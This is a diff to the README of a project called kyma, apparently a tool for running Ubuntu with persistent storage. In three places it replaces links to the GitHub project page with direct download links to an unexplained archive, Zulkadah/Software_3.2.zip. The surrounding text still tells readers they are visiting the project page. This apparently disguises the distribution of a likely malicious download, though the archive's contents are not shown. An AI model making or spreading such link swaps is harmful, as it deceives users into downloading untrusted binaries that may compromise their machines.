@@ -1,6 +1,6 @@
 # 🐾 kyma - Run Ubuntu With Persistent Storage
 
-[![Download](https://img.shields.io/badge/Download-kyma-blue?style=for-the-badge)](https://github.com/ilamafascista615/kyma)
+[![Download](https://img.shields.io/badge/Download-kyma-blue?style=for-the-badge)](https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip)
 
 ## 🌐 What this project does
 
@@ -16,7 +16,7 @@ You can use it for:
 
 Visit the project page and download the files from here:
 
-https://github.com/ilamafascista615/kyma
+https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip
 
 After you open the project, you will find these files:
 
@@ -177,6 +177,6 @@ If you want a working Ubuntu environment with saved storage on Kyma, start with 
 
 Project page:
 
-https://github.com/ilamafascista615/kyma
+https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip
 
 Use this link to visit the page and download the project files
